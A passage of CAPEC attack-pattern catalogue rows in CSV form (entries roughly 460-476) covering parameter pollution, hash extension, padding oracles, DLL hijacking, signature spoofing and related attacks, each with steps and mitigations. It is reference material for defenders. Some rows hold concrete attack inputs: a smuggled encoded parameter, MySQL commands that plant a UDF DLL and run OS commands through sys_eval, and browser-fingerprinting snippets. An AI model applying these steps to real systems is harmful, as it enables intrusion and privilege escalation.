in a form or action. This can also be found by looking at parameters in the URL in the navigation bar of the browser::STEP:2:PHASE:Experiment:DESCRIPTION:[Add Duplicate Parameter Values] Once the adversary has identified what user input is used as HTTP parameters, they will add duplicates to each parameter one by one to observe the results. If the response from the HTTP request shows the duplicate parameter value concatenated with the original parameter value in some way, or simply just the duplicate parameter value, then HPP is possible.:TECHNIQUE:In the URL, add a duplicate parameter by using the & delimiter. For example par1=val1 becomes par1=val1&par1=val2. Depending on the backend API, this could be treated as par1=val1, val2, which could lead to par1 being set to val2, ignoring val1.:TECHNIQUE:If the request is created based on user input directly on the page, the adversary will test by adding an encoded delimiter to the input. For example, the adverary might supply 1000%26action=withdraw and the backend might interpret a POST request with the paramters action=deposit&amount=1000&action=withdraw::STEP:3:PHASE:Exploit:DESCRIPTION:[Leverage HPP] Once the adversary has identified how the backend handles duplicate parameters, they will leverage this by polluting the paramters in a way that benefits them. In some cases, hardcoded parameters will be disregarded by the backend. In others, the adversary can bypass a WAF that might only check a parameter before it has been concatenated by the backend, resulting in malicious queries getting through.::\",\"::HTTP protocol is used with some GET/POST parameters passed::\",\"\",\"::Any tool that enables intercepting and tampering with HTTP requests::\",\"\",\"\",\"::Configuration: If using a Web Application Firewall (WAF), filters should be carefully configured to detect abnormal HTTP requests::Design: Perform URL encoding::Implementation: Use strict regular expressions in URL rewriting::Implementation: Beware of multiple occurrences of a parameter in a Query String::\",\"\",\"::88::147::235::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Web Parameter Tampering::\",\"\",\n461,\"Web Services API Signature Forgery Leveraging Hash Function Extension Weakness\",Standard,Draft,\"An adversary utilizes a hash function extension/padding weakness, to modify the parameters passed to the web service requesting authentication by generating their own call in order to generate a legitimate signature hash (as described in the notes), without knowledge of the secret token sometimes provided by the web service.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:115::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find a vulnerable web service] The adversary finds a web service that uses a vulnerable authentication scheme, where an authentication token is concatenated with the parameters of a request and then hashed:TECHNIQUE:Read application documentation to learn about authentication schemes being used:TECHNIQUE:Observe web service traffic to look for vulnerable authentication schemes::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt adding padding to parameters] An adversary tests if they can simply add padding to the parameters of a request such that the request is technically changed, with the hash remaining the same:TECHNIQUE:Exploit the hash function extension / padding weakness with only padding to test the weakness::STEP:3:PHASE:Exploit:DESCRIPTION:[Add malicious parameters to request] Add malicious parameters to a captured request in addition to what is already present. Do this by exploiting the padding weakness of the hash function and send the request to the web service so that it believes it is authenticated and acts on the extra parameters.:TECHNIQUE:Exploit the hash function extension / padding weakness by adding malicious parameters to a web service request such that it is still deemed authentic::\",\"::Web services check the signature of the API calls::Authentication tokens / secrets are shared between the server and the legitimate client::The API call signature is generated by concatenating the parameter list with the shared secret and hashing the result.::An iterative hash function like MD5 and SHA1 is used.::An attacker is able to intercept or in some other way gain access to the information passed between the legitimate client and the server in order to retrieve the hash value and length of the original message.::The communication channel between the client and the server is not secured via channel security such as TLS::\",\"::SKILL:Medium level of cryptography knowledge, specifically how iterative hash functions work. This is needed to select proper padding.:LEVEL:Medium::\",\"::Access to a function to produce a hash (e.g., MD5, SHA1) Tools that allow the attacker to intercept a message between the client and the server, specifically the hash that is the signature and the length of the original message concatenated with the secret bytes::\",\"\",\"\",\"::Design: Use a secure message authentication code (MAC) function such as an HMAC-SHA1::\",\"::To leverage an attack against the has function extension / padding weakness, consider the message to be passed to the web service is M (this message includes the parameters passed to the web service concatenated with the secret token / key bytes). The message M is hashed and that hash is passed to the web service and is used for authentication. The attacker does not know M, but can see Hash (M) and Length (M). The attacker can then compute Hash (M || Padding (M) || M') for any M'. The attacker does not know the entire message M, specifically the attacker does not know the secret bytes, but that does not matter. The attacker is still able to sign their own message M' and make the called web service verify the integrity of the message without an error.::\",\"::328::290::\",\"\",\"\",\n462,\"Cross-Domain Search Timing\",Detailed,Draft,\"An attacker initiates cross domain HTTP / GET requests and times the server responses. The timing of these responses may leak important information on what is happening on the server. Browser's same origin policy prevents the attacker from directly reading the server responses (in the absence of any other weaknesses), but does not prevent the attacker from timing the responses to requests that the attacker issued cross domain.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:54::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine service to send cross domain requests to] The adversary first determines which service they will be sending the requests to::STEP:2:PHASE:Experiment:DESCRIPTION:[Send and time various cross domain requests] Adversaries will send a variety of cross domain requests to the target, timing the time it takes for the target to respond. Although they won't be able to read the response, the adversary can use the time to infer information about what the service did upon receiving the request.:TECHNIQUE:Using a GET request, leverage the img tag in conjunction with onload() / onerror() javascript events to time a response:TECHNIQUE:Using a POST request, leverage the iframe element and use the onload() event to time a response::STEP:3:PHASE:Exploit:DESCRIPTION:[Infer information from the response time] After obtaining reponse times to various requests, the adversary will compare these times and infer potentially sensitive information. An example of this could be asking a service to retrieve information and random usernames. If one request took longer to process, it is likely that a user with that username exists, which could be useful knowledge to an adversary.:TECHNIQUE:Compare timing of different requests to infer potentially sensitive information about a target service::\",\"::Ability to issue GET / POST requests cross domainJava Script is enabled in the victim's browserThe victim has an active session with the site from which the attacker would like to receive informationThe victim's site does not protect search functionality with cross site request forgery (CSRF) protection::\",\"::SKILL:Some knowledge of Java Script:LEVEL:Low::\",\"::Ability to issue GET / POST requests cross domain::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Design: The victim's site could protect all potentially sensitive functionality (e.g. search functions) with cross site request forgery (CSRF) protection and not perform any work on behalf of forged requests::Design: The browser's security model could be fixed to not leak timing information for cross domain requests::\",\"\",\"::385::352::208::\",\"\",\"\",\n463,\"Padding Oracle Crypto Attack\",Detailed,Draft,\"An adversary is able to efficiently decrypt data without knowing the decryption key if a target system leaks data on whether or not a padding error happened while decrypting the ciphertext. A target system that leaks this type of information becomes the padding oracle and an adversary is able to make use of that oracle to efficiently decrypt data without knowing the decryption key by issuing on average 128*b calls to the padding oracle (where b is the number of bytes in the ciphertext block). In addition to performing decryption, an adversary is also able to produce valid ciphertexts (i.e., perform encryption) by using the padding oracle, all without knowing the encryption key.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:97::\",\"\",\"::The decryption routine does not properly authenticate the message / does not verify its integrity prior to performing the decryption operation::The target system leaks data (in some way) on whether a padding error has occurred when attempting to decrypt the ciphertext.::The padding oracle remains available for enough time / for as many requests as needed for the adversary to decrypt the ciphertext.::\",\"\",\"::Ability to detect instances where a target system is vulnerable to an oracle padding attack Sufficient cryptography knowledge and tools needed to take advantage of the presence of the padding oracle to perform decryption / encryption of data without a key::\",\"\",\"\",\"::Design: Use a message authentication code (MAC) or another mechanism to perform verification of message authenticity / integrity prior to decryption::Implementation: Do not leak information back to the user as to any cryptography (e.g., padding) encountered during decryption.::\",\"::An adversary sends a request containing ciphertext to the target system. Due to the browser's same origin policy, the adversary is not able to see the response directly, but can use cross-domain information leak techniques to still get the information needed (i.e., information on whether or not a padding error has occurred). This can be done using img tag plus the onerror()/onload() events. The adversary's JavaScript can make web browsers to load an image on the target site, and know if the image is loaded or not. This is 1-bit information needed for the padding oracle attack to work: if the image is loaded, then it is valid padding, otherwise it is not.::\",\"::209::514::649::347::354::696::\",\"\",\"\",\n464,\"Evercookie\",Standard,Draft,\"An attacker creates a very persistent cookie that stays present even after the user thinks it has been removed. The cookie is stored on the victim's machine in over ten places. When the victim clears the cookie cache via traditional means inside the browser, that operation removes the cookie from certain places but not others. The malicious code then replicates the cookie from all of the places where it was not deleted to all of the possible storage locations once again. So the victim again has the cookie in all of the original storage locations. In other words, failure to delete the cookie in even one location will result in the cookie's resurrection everywhere. The evercookie will also persist across different browsers because certain stores (e.g., Local Shared Objects) are shared between different browsers.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:554::\",\"\",\"::The victim's browser is not configured to reject all cookiesThe victim visits a website that serves the attackers' evercookie::\",\"\",\"::Evercookie source code::\",\"\",\"\",\"::Design: Browser's design needs to be changed to limit where cookies can be stored on the client side and provide an option to clear these cookies in all places, as well as another option to stop these cookies from being written in the first place.::Design: Safari browser's private browsing mode is currently effective against evercookies.::\",\"\",\"::359::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1606.001:ENTRY NAME:Forge Web Credentials: Web Cookies::\",\"\",\n465,\"Transparent Proxy Abuse\",Standard,Draft,\"A transparent proxy serves as an intermediate between the client and the internet at large. It intercepts all requests originating from the client and forwards them to the correct location. The proxy also intercepts all responses to the client and forwards these to the client. All of this is done in a manner transparent to the client.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:554::\",\"\",\"::Transparent proxy is usedVulnerable configuration of network topology involving the transparent proxy (e.g., no NAT happening between the client and the proxy)Execution of malicious Flash or Applet in the victim's browser::\",\"::SKILL:Creating malicious Flash or Applet to open a cross-domain socket connection to a remote system:LEVEL:Medium::\",\"\",\"\",\"\",\"::Design: Ensure that the transparent proxy uses an actual network layer IP address for routing requests. On the transparent proxy, disable the use of routing based on address information in the HTTP host header.::Configuration: Disable in the browser the execution of Java Script, Flash, SilverLight, etc.::\",\"\",\"::441::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1090.001:ENTRY NAME:Proxy: Internal Proxy::\",\"\",\n466,\"Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy\",Standard,Draft,\"An attacker leverages an adversary in the middle attack (CAPEC-94) in order to bypass the same origin policy protection in the victim's browser. This active adversary in the middle attack could be launched, for instance, when the victim is connected to a public WIFI hot spot. An attacker is able to intercept requests and responses between the victim's browser and some non-sensitive website that does not use TLS.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:94::\",\"\",\"::The victim and the attacker are both in an environment where an active adversary in the middle attack is possible (e.g., public WIFI hot spot)The victim visits at least one website that does not use TLS / SSL::\",\"::SKILL:Ability to intercept and modify requests / responses:LEVEL:Low::SKILL:Ability to create iFrame and JavaScript code that would initiate unauthorized requests to sensitive sites from the victim's browser:LEVEL:Medium::SKILL:Solid understanding of the HTTP protocol:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Design: Tunnel communications through a secure proxy::Design: Trust level separation for privileged / non privileged interactions (e.g., two different browsers, two different users, two different operating systems, two different virtual machines)::\",\"\",\"::300::\",\"\",\"\",\n467,\"Cross Site Identification\",Detailed,Draft,\"An attacker harvests identifying information about a victim via an active session that the victim's browser has with a social networking site. A victim may have the social networking site open in one tab or perhaps is simply using the remember me feature to keep their session with the social networking site active. An attacker induces a payload to execute in the victim's browser that transparently to the victim initiates a request to the social networking site (e.g., via available social network site APIs) to retrieve identifying information about a victim. While some of this information may be public, the attacker is able to harvest this information in context and may use it for further attacks on the user (e.g., spear phishing).\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:62::\",\"\",\"::The victim has an active session with the social networking site.::\",\"::SKILL:An attacker should be able to create a payload and deliver it to the victim's browser.:LEVEL:High::SKILL:An attacker needs to know how to interact with various social networking sites (e.g., via available APIs) to request information and how to send the harvested data back to the attacker.:LEVEL:Medium::\",\"\",\"\",\"\",\"::Usage: Users should always explicitly log out from the social networking sites when done using them.::Usage: Users should not open other tabs in the browser when using a social networking site.::\",\"::An attacker may post a malicious posting that contains an image with an embedded link. The link actually requests identifying information from the social networking site. A victim who views the malicious posting in their browser will have sent identifying information to the attacker, as long as the victim had an active session with the social networking site.::\",\"::352::359::\",\"\",\"\",\n468,\"Generic Cross-Browser Cross-Domain Theft\",Standard,Draft,\"An attacker makes use of Cascading Style Sheets (CSS) injection to steal data cross domain from the victim's browser. The attack works by abusing the standards relating to loading of CSS: 1. Send cookies on any load of CSS (including cross-domain) 2. When parsing returned CSS ignore all data that does not make sense before a valid CSS descriptor is found by the CSS parser.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:242::\",\"\",\"::No new lines can be present in the injected CSS stringProper HTML or URL escaping of the and ' characters is not presentThe attacker has control of two injection points: pre-string and post-string::\",\"::SKILL:Ability to craft a CSS injection:LEVEL:High::\",\"::Attacker controlled site/page to render a page referencing the injected CSS string::\",\"\",\"\",\"::Design: Prior to performing CSS parsing, require the CSS to start with well-formed CSS when it is a cross-domain load and the MIME type is broken. This is a browser level fix.::Implementation: Perform proper HTML encoding and URL escaping::\",\"\",\"::707::149::177::838::\",\"\",\"\",\n469,\"HTTP DoS\",Standard,Draft,\"An attacker performs flooding at the HTTP level to bring down only a particular web application rather than anything listening on a TCP/IP connection. This denial of service attack requires substantially fewer packets to be sent which makes DoS harder to detect. This is an equivalent of SYN flood in HTTP. The idea is to keep the HTTP session alive indefinitely and then repeat that hundreds of times. This attack targets resource depletion weaknesses in web server software. The web server will wait to attacker's responses on the initiated HTTP sessions while the connection threads are being exhausted.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:227::\",\"\",\"::HTTP protocol is usedWeb server used is vulnerable to denial of service via HTTP flooding::\",\"\",\"::Ability to issues hundreds of HTTP requests::\",\"\",\"\",\"::Configuration: Configure web server software to limit the waiting period on opened HTTP sessions::Design: Use load balancing mechanisms::\",\"\",\"::770::772::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service: Service Exhaustion Flood::\",\"\",\n47,\"Buffer Overflow via Parameter Expansion\",Detailed,Draft,\"In this attack, the target software is given input that the adversary knows will be modified and expanded in size during processing. This attack relies on the target software failing to anticipate that the expanded data may exceed some internal limit, thereby creating a buffer overflow.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:100::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries often look for applications that accept user input and that perform manual memory management.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.:TECHNIQUE:In this attack, the normal method of providing large user input does not work. The program performs bounds checking on the user input, but not the expanded user input. The adversary needs to provide input that they believe will be expanded by the program to overflow a buffer. To identify where this is possible, an adversary either needs to have knowledge of the inner workings of the program or use a disassembler and other reverse engineering tools to guide the search.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the input to be given to the program. If the intent is to simply cause the software to crash, the input needs only to expand to an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft input that expands in a way that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.:TECHNIQUE:Create specific files and directories on the system and then give input using path traversal shortcuts to those directories that could expand past an input buffer.::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary gives the crafted input to the program, overflowing the buffer.::\",\"::The program expands one of the parameters passed to a function with input controlled by the user, but a later function making use of the expanded parameter erroneously considers the original, not the expanded size of the parameter.::The expanded parameter is used in the context where buffer overflow may become possible due to the incorrect understanding of the parameter size (i.e. thinking that it is smaller than it really is).::\",\"::SKILL:Finding this particular buffer overflow may not be trivial. Also, stack and especially heap based buffer overflows require a lot of knowledge if the intended goal is arbitrary code execution. Not only that the adversary needs to write the shell code to accomplish their goals, but the adversary also needs to find a way to get the program execution to jump to the planted shell code. There also needs to be sufficient room for the payload. So not every buffer overflow will be exploitable, even by a skilled adversary.:LEVEL:High::\",\"::Access to the program source or binary. If the program is only available in binary then a disassembler and other reverse engineering tools will be helpful.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Ensure that when parameter expansion happens in the code that the assumptions used to determine the resulting size of the parameter are accurate and that the new size of the parameter is visible to the whole system::\",\"::Attack Example: FTP glob() The glob() function in FTP servers has been susceptible to attack as a result of incorrect resizing. This is an ftpd glob() Expansion LIST Heap Overflow Vulnerability. ftp daemon contains a heap-based buffer overflow condition. The overflow occurs when the LIST command is issued with an argument that expands into an oversized string after being processed by glob(). This buffer overflow occurs in memory that is dynamically allocated. It may be possible for adversaries to exploit this vulnerability and execute arbitrary code on the affected host. To exploit this, the adversary must be able to create directories on the target host. The glob() function is used to expand short-hand notation into complete file names. By sending to the FTP server a request containing a tilde (~) and other wildcard characters in the pathname string, a remote adversary can overflow a buffer and execute arbitrary code on the FTP server to gain root privileges. Once the request is processed, the glob() function expands the user input, which could exceed the expected length. In order to exploit this vulnerability, the adversary must be able to create directories on the FTP server. [REF-1]See also: CVE-2001-0249::Buffer overflow in the glob implementation in libc in NetBSD-current before 20050914, and NetBSD 2.* and 3.* before 20061203, as used by the FTP daemon, allows remote authenticated users to execute arbitrary code via a long pathname that results from path expansion. The limit computation of an internal buffer was done incorrectly. The size of the buffer in byte was used as element count, even though the elements of the buffer are 2 bytes long. Long expanded path names would therefore overflow the buffer.See also: CVE-2006-6652::\",\"::120::119::118::130::131::74::20::680::697::\",\"\",\"\",\n470,\"Expanding Control over the Operating System from the Database\",Detailed,Draft,\"An attacker is able to leverage access gained to the database to read / write data to the file system, compromise the operating system, create a tunnel for accessing the host machine, and use this access to potentially attack other machines on the same network as the database machine. Traditionally SQL injections attacks are viewed as a way to gain unauthorized read access to the data stored in the database, modify the data in the database, delete the data, etc. However, almost every data base management system (DBMS) system includes facilities that if compromised allow an attacker complete access to the file system, operating system, and full access to the host running the database. The attacker can then use this privileged access to launch subsequent attacks. These facilities include dropping into a command shell, creating user defined functions that can call system level libraries present on the host machine, stored procedures, etc.\",\"\",,Very High,\"::NATURE:ChildOf:CAPEC ID:66::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:The adversary identifies a database management system running on a machine they would like to gain control over, or on a network they want to move laterally through.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary goes about the typical steps of an SQL injection and determines if an injection is possible.::STEP:3:PHASE:Experiment:DESCRIPTION:Once the Adversary determines that an SQL injection is possible, they must ensure that the requirements for the attack are met. These are a high privileged session user and batched query support. This is done in similar ways to discovering if an SQL injection is possible.::STEP:4:PHASE:Experiment:DESCRIPTION:If the requirements are met, based on the database management system that is running, the adversary will find or create user defined functions (UDFs) that can be loaded as DLLs. An example of a DLL can be found at https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql::STEP:5:PHASE:Experiment:DESCRIPTION:In order to load the DLL, the adversary must first find the path to the plugin directory. The command to achieve this is different based on the type of DBMS, but for MySQL, this can be achieved by running the command select @@plugin_dir::STEP:6:PHASE:Exploit:DESCRIPTION:The DLL is then moved into the previously found plugin directory so that the contained functions can be loaded. This can be done in a number of ways; loading from a network share, writing the entire hex encoded string to a file in the plugin directory, or loading the DLL into a table and then into a file. An example using MySQL to load the hex string is as follows. select 0x4d5a9000... into dump file {plugin directory}udf.dll;::STEP:6:PHASE:Exploit:DESCRIPTION:Once the DLL is in the plugin directory, a command is then run to load the UDFs. An example of this in MySQL is create function sys_eval returns string soname 'udf.dll'; The function sys_eval is specific to the example DLL listed above.::STEP:6:PHASE:Exploit:DESCRIPTION:Once the adversary has loaded the desired function(s), they will use these to execute arbitrary commands on the compromised system. This is done through a simple select command to the loaded UDF. For example: select sys_eval('dir');. Because the prerequisite to this attack is that the database session user is a super user, this means that the adversary will be able to execute commands with elevated privileges.::\",\"::A vulnerable DBMS is usedA SQL injection exists that gives an attacker access to the database or an attacker has access to the DBMS via other means::\",\"::SKILL:Low level knowledge of the various facilities available in different DBMS systems for interacting with the file system and operating system:LEVEL:High::\",\"\",\"\",\"\",\"::Design: Follow the defensive programming practices needed to protect an application accessing the database from SQL injection::Configuration: Ensure that the DBMS is patched with the latest security patches::Design: Ensure that the DBMS login used by the application has the lowest possible level of privileges in the DBMS::Design: Ensure that DBMS runs with the lowest possible level of privileges on the host machine and that it runs as a separate user::Usage: Do not use the DBMS machine for anything else other than the database::Usage: Do not place any trust in the database host on the internal network. Authenticate and validate all network activity originating from the database host.::Usage: Use an intrusion detection system to monitor network connections and logs on the database host.::Implementation: Remove / disable all unneeded / unused functions of the DBMS system that may allow an attacker to elevate privileges if compromised::\",\"\",\"::250::89::\",\"\",\"\","
  },
  "doc-a62bae2c4a1706bfa78e2aec42273b84": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n471,\"Search Order Hijacking\",Detailed,Stable,\"An adversary exploits a weakness in an application's specification of external libraries to exploit the functionality of the loader where the process loading the library searches first in the same directory in which the process binary resides and then in other directories. Exploitation of this preferential search order can allow an attacker to make the loading process load the adversary's rogue library rather than the legitimate library. This attack can be leveraged with many different libraries and with many different loading processes. No forensic trails are left in the system's registry or file system that an incorrect library had been loaded.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:159::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target general susceptibility] An attacker uses an automated tool or manually finds whether the target application uses dynamically linked libraries and the configuration file or look up table (such as Procedure Linkage Table) which contains the entries for dynamically linked libraries.:TECHNIQUE:The attacker uses a tool such as the OSX otool utility or manually probes whether the target application uses dynamically linked libraries.:TECHNIQUE:The attacker finds the configuration files containing the entries to the dynamically linked libraries and modifies the entries to point to the malicious libraries the attacker crafted.::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft malicious libraries] The attacker uses knowledge gained in the Explore phase to craft malicious libraries that they will redirect the target to leverage. These malicious libraries could have the same APIs as the legitimate library and additional malicious code.:TECHNIQUE:The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using sleep(2) and usleep() to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.::STEP:3:PHASE:Exploit:DESCRIPTION:[Redirect the access to libraries to the malicious libraries] The attacker redirects the target to the malicious libraries they crafted in the Experiment phase. The attacker will be able to force the targeted application to execute arbitrary code when the application attempts to access the legitimate libraries.:TECHNIQUE:The attacker modifies the entries in the configuration files pointing to the malicious libraries they crafted.:TECHNIQUE:The attacker leverages symlink/timing issues to redirect the target to access the malicious libraries they crafted. See also: CAPEC-132.:TECHNIQUE:The attacker leverages file search path order issues to redirect the target to access the malicious libraries they crafted. See also: CAPEC-38.::\",\"::Attacker has a mechanism to place its malicious libraries in the needed location on the file system.::\",\"::SKILL:Ability to create a malicious library.:LEVEL:Medium::\",\"\",\"\",\"\",\"::Design: Fix the Windows loading process to eliminate the preferential search order by looking for DLLs in the precise location where they are expected::Design: Sign system DLLs so that unauthorized DLLs can be detected.::\",\"::For instance, an attacker with access to the file system may place a malicious ntshrui.dll in the C:Windows directory. This DLL normally resides in the System32 folder. Process explorer.exe which also resides in C:Windows, upon trying to load the ntshrui.dll from the System32 folder will actually load the DLL supplied by the attacker simply because of the preferential search order. Since the attacker has placed its malicious ntshrui.dll in the same directory as the loading explorer.exe process, the DLL supplied by the attacker will be found first and thus loaded in lieu of the legitimate DLL. Since explorer.exe is loaded during the boot cycle, the attackers' malware is guaranteed to execute.::macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence. A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.::\",\"::427::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.001:ENTRY NAME:Hijack Execution Flow:DLL search order hijacking::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.004:ENTRY NAME:Hijack Execution Flow: Dylib Hijacking::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.008:ENTRY NAME:Hijack Execution Flow: Path Interception by Search Order Hijacking::\",\"\",\n472,\"Browser Fingerprinting\",Detailed,Draft,\"An attacker carefully crafts small snippets of Java Script to efficiently detect the type of browser the potential victim is using. Many web-based attacks need prior knowledge of the web browser including the version of browser to ensure successful exploitation of a vulnerability. Having this knowledge allows an attacker to target the victim with attacks that specifically exploit known or zero day weaknesses in the type and version of the browser used by the victim. Automating this process via Java Script as a part of the same delivery system used to exploit the browser is considered more efficient as the attacker can supply a browser fingerprinting method and integrate it with exploit code, all contained in Java Script and in response to the same web page request by the browser.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:541::\",\"\",\"::Victim's browser visits a website that contains attacker's Java ScriptJava Script is not disabled in the victim's browser::\",\"\",\"\",\"\",\"\",\"::Configuration: Disable Java Script in the browser::\",\"::The following code snippets can be used to detect various browsers: Firefox 2/3 FF=/a/[-1]=='a' Firefox 3 FF3=(function x(){})[-5]=='x' Firefox 2 FF2=(function x(){})[-6]=='x' IE IE='v'=='v' Safari Saf=/a/.__proto__=='//' Chrome Chr=/source/.test((/a/.toString+'')) Opera Op=/^function (/.test([].sort)::\",\"::200::\",\"\",\"\",\n473,\"Signature Spoof\",Standard,Draft,\"An attacker generates a message or datablock that causes the recipient to believe that the message or datablock was generated and cryptographically signed by an authoritative or reputable source, misleading a victim or victim operating system into performing malicious actions.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:151::\",\"\",\"::The victim or victim system is dependent upon a cryptographic signature-based verification system for validation of one or more security events or actions.::The validation can be bypassed via an attacker-provided signature that makes it appear that the legitimate authoritative or reputable source provided the signature.::\",\"::SKILL:Technical understanding of how signature verification algorithms work with data and applications:LEVEL:High::\",\"\",\"\",\"::SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::\",\"\",\"::An attacker provides a victim with a malicious executable disguised as a legitimate executable from an established software by signing the executable with a forged cryptographic key. The victim's operating system attempts to verify the executable by checking the signature, the signature is considered valid, and the attackers' malicious executable runs.::An attacker exploits weaknesses in a cryptographic algorithm to that allow a private key for a legitimate software vendor to be reconstructed, attacker-created malicious software is cryptographically signed with the reconstructed key, and is installed by the victim operating system disguised as a legitimate software update from the software vendor.::\",\"::20::327::290::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.001:ENTRY NAME:Masquerading: Invalid Code Signature::::TAXONOMY NAME:ATTACK:ENTRY ID:1553.002:ENTRY NAME:Subvert Trust Controls: Code Signing::\",\"\",\n474,\"Signature Spoofing by Key Theft\",Detailed,Draft,\"An attacker obtains an authoritative or reputable signer's private signature key by theft and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:473::\",\"\",\"::An authoritative or reputable signer is storing their private signature key with insufficient protection.::\",\"::SKILL:Knowledge of common location methods and access methods to sensitive data:LEVEL:Low::SKILL:Ability to compromise systems containing sensitive data:LEVEL:High::\",\"\",\"\",\"\",\"::Restrict access to private keys from non-supervisory accounts::Restrict access to administrative personnel and processes only::Ensure all remote methods are secured::Ensure all services are patched and up to date::\",\"\",\"::522::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1552.004:ENTRY NAME:Unsecured Credentials: Private Keys::\",\"\",\n475,\"Signature Spoofing by Improper Validation\",Detailed,Draft,\"An adversary exploits a cryptographic weakness in the signature verification algorithm implementation to generate a valid signature without knowing the key.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:473::NATURE:CanPrecede:CAPEC ID:542::\",\"\",\"::Recipient is using a weak cryptographic signature verification algorithm or a weak implementation of a cryptographic signature verification algorithm, or the configuration of the recipient's application accepts the use of keys generated using cryptographically weak signature verification algorithms.::\",\"::SKILL:Cryptanalysis of signature verification algorithm:LEVEL:High::SKILL:Reverse engineering and cryptanalysis of signature verification algorithm implementation:LEVEL:High::\",\"\",\"\",\"\",\"::Use programs and products that contain cryptographic elements that have been thoroughly tested for flaws in the signature verification routines.::\",\"::The Windows CryptoAPI (Crypt32.dll) was shown to be vulnerable to signature spoofing by failing to properly validate Elliptic Curve Cryptography (ECC) certificates. If the CryptoAPI's signature validator allows the specification of a nonstandard base point (G): An adversary can create a custom ECDSA certificate with an elliptic curve (ECC) signature that appears to match a known standard curve, like P-256 that includes a public key for an existing known trusted certificate authority, but which was in fact not signed by that certificate authority. Windows checks the public key and other curve parameters, but not the (bespoke adversary-supplied) base point generator (G) parameter constant which actually generated the curve [REF-562]. Exploiting this vulnerability allows the adversary to leverage a spoofed certificate to dupe trusted network connections and deliver/execute malicious code, while appearing as legitimately trusted entity [REF-563]. This ultimately tricks the victim into believing the malicious website or executable is legitimate and originates from a properly verified source. See also: CVE-2020-0601::\",\"::347::327::295::\",\"\",\"\",\n476,\"Signature Spoofing by Misrepresentation\",Detailed,Draft,\"An attacker exploits a weakness in the parsing or display code of the recipient software to generate a data blob containing a supposedly valid signature, but the signer's identity is falsely represented, which can lead to the attacker manipulating the recipient software or its victim user to perform compromising actions.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:473::\",\"\",\"::Recipient is using signature verification software that does not clearly indicate potential homographs in the signer identity.Recipient is using signature verification software that contains a parsing vulnerability, or allows control characters in the signer identity field, such that a signature is mistakenly displayed as valid and from a known or authoritative signer.::\",\"::SKILL:Attacker needs to understand the layout and composition of data blobs used by the target application.:LEVEL:High::SKILL:To discover a specific vulnerability, attacker needs to reverse engineer signature parsing, signature verification and signer representation code.:LEVEL:High::SKILL:Attacker may be 